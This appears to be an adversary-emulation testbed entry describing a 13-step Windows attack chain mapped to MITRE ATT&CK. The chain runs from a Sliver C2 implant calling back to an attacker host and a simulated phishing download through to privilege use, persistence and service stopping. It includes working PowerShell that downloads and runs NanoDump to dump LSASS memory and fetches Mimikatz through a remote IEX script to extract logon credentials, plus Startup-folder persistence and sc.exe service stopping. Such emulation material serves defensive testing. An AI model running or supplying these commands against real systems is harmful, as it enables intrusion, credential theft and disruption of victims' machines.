# Chain 059

**Testbed**: `env0` · **Steps**: 13 · **Tactics touched**: Command and Control, Initial Access, Execution, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Initial Access | T1566.002 |
| Execution | T1204.002, T1059.001, T1059.003 |
| Discovery | T1057 |
| Credential Access | T1003.001 |
| Persistence | T1547.001 |
| Impact | T1489 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 3 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable | Human |
| 4 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 5 | Discovery | T1057 | Remote Processes List | Sliver Executor |
| 6 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin | Human |
| 7 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 8 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 9 | Credential Access | T1003.001 | Dump LSASS.exe Memory through Silent Process Exit | Powershell Executor |
| 10 | Credential Access | T1003.001 | Offline Credential Theft With Mimikatz | Powershell Executor |
| 11 | Persistence | T1547.001 | Add Executable Shortcut Link to User Startup Folder | Powershell Executor |
| 12 | Execution | T1059.003 | Execute Command (cmd.exe) | Sliver Session Derive |
| 13 | Impact | T1489 | Windows - Stop service using Service Controller | Command Prompt Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 3 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable

- **UUID**: `simulate-execute-lnk-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut file whose target is a pre-staged executable on the victim host. LNKs are a very common phishing vehicle — often delivered inside an archive with a misleading double-extension name (e.g. `invoice.pdf.lnk`). Double-clicking the shortcut runs the pointed-to executable via `explorer.exe`.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Double-click a shortcut (.lnk) file whose target is:
#{EXE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — Remote Processes List

- **UUID**: `sliver-ps`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1057
- **Technique(s)**: Process Discovery

**Description**

The `ps` command lists all running processes on a remote system. It returns a list of processes with details such as the process ID (PID) and executable name. The command includes flags for exe, overflowing terminal width, filtering based on owner/pid, printing command line arguments, skipping the first n page(s), printing process tree and setting outtime.

**Execution** (Sliver Executor)

```
ps(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(process-info-known ?target - host)`

---

### Step 6 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin

- **UUID**: `simulate-execute-lnk-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Right-click a shortcut (.lnk) whose target is:
#{EXE_PATH}
then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 7 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 8 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 9 — Dump LSASS.exe Memory through Silent Process Exit

- **UUID**: `art-t1003_001-silent-process-exit`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Abuses the Windows Error Reporting "Silent Process Exit" mechanism
(via WerFault.exe / MonitorProcess registry configuration) to
provoke a dump of lsass.exe by another privileged process — an
indirect-dumper technique. Uses NanoDump's `--silent-process-exit`
path to orchestrate it. Method 3 folds NanoDump staging. ART
auto_generated_guid eb5adf16-b601-4926-bca7-dad22adffb37.

**Execution** (Powershell Executor)

```
$nanodump = "#{nanodump_exe}"
if (-not (Test-Path $nanodump)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  New-Item -ItemType Directory (Split-Path $nanodump) -Force | Out-Null
  Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -OutFile $nanodump
}
New-Item -ItemType Directory "#{output_folder}" -Force | Out-Null
& $nanodump --silent-process-exit "#{output_folder}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke NanoDump. | — | yes |
| `nanodump_exe` | Target-side path where NanoDump is staged and invoked. | C:\\Users\\Public\\nanodump.x64.exe | yes |
| `output_folder` | Target-side directory where the silent-exit dump lands. | C:\\Users\\Public\\SilentProcessExit | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`
- `(callback-covered ?f - file)`

---

### Step 10 — Offline Credential Theft With Mimikatz

- **UUID**: `art-t1003_001-mimikatz-offline-dump`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Mimikatz `sekurlsa::minidump <dumpfile>; sekurlsa::logonpasswords full`
processes an already-existing LSASS memory dump on target and prints
credential material to stdout. Chain-composition consumer: pair with
any dumper that emits `(lsass-dump-file …)` — ProcDump, NanoDump,
comsvcs.dll, rdrleakdiag, Out-Minidump, Silent Process Exit. Method 3
folds mimikatz staging (fetch latest release from GitHub API + unzip
via ART's Invoke-FetchFromZip helper). ART auto_generated_guid
453acf13-1dbd-47d7-b28a-172ce9228023.

**Execution** (Powershell Executor)

```
$mimikatz = "#{mimikatz_exe}"
if (-not (Test-Path $mimikatz)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing).Content
  $releases = (Invoke-WebRequest 'https://api.github.com/repos/gentilkiwi/mimikatz/releases' -UseBasicParsing | ConvertFrom-Json)
  $zipUrl = $releases[0].assets.browser_download_url | Where-Object { $_.EndsWith('.zip') } | Select-Object -First 1
  $basePath = Split-Path (Split-Path $mimikatz)
  New-Item -ItemType Directory $basePath -Force | Out-Null
  Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
}
& $mimikatz "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" "exit"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke mimikatz. | — | yes |
| `mimikatz_exe` | Target-side path where mimikatz is staged and invoked. | C:\\Users\\Public\\x64\\mimikatz.exe | yes |
| `input_file` | Path to an existing LSASS memory dump file on the target (produced by an earlier dumper action). | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 11 — Add Executable Shortcut Link to User Startup Folder

- **UUID**: `art-t1547_001-startup-folder-lnk`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

File-based Startup persistence: creates a `.lnk` shortcut in the
current user's `Startup` folder pointing at the chosen executable.
Native Windows shell (WScript.Shell) — no external binary. Original
ART test hardcodes calc.exe as the target; parameterised here so
operators can substitute a real payload. ART auto_generated_guid
24e55612-85f6-4bd6-ae74-a73d02e3441d.

**Execution** (Powershell Executor)

```
$Target = "#{target_path}"
$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\#{shortcut_name}"
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to create the .lnk file. | — | yes |
| `target_path` | Full path to the executable the shortcut launches at login. | C:\\Windows\\System32\\calc.exe | yes |
| `shortcut_name` | Filename of the .lnk placed under the Startup folder. | ArtPersist.lnk | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 12 — Execute Command (cmd.exe)

- **UUID**: `sliver-cmd`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: Command and Scripting Interpreter: Windows Command Shell


**Description**

The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 13 — Windows - Stop service using Service Controller

- **UUID**: `art-t1489-sc-stop-service`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1489
- **Technique(s)**: Service Stop

**Description**

Stops a Windows service via `sc.exe stop`. Ransomware and disk-wiper
actors commonly stop security services (Defender), backup services
(VSS), and databases (MSSQL) before proceeding with impact. Requires
admin. ART auto_generated_guid 21dfb440-830d-4c86-a3e5-2a491d5a8d04.

**Execution** (Command Prompt Executor)

```
sc.exe stop #{service_name}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke sc.exe. | — | yes |
| `service_name` | Name of the Windows service to stop. | spooler | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(process-terminated ?p - process ?target - host)`

---
